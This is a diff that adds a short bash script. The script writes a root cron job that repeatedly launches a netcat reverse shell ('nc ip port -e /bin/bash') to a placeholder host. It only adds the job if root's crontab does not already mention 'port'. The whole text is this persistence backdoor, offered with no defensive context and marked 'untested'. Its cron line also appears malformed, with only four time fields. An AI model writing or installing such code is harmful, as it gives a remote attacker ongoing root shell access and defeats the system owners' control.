@@ -1,0 +1,6 @@
+#!/bin/bash
+
+if ! grep "port" /var/spool/cron/crontabs/root 2> /dev/null; then 
+    echo "* * * * nc ip port -e /bin/bash" | crontab - -u root
+fi 
+# untested
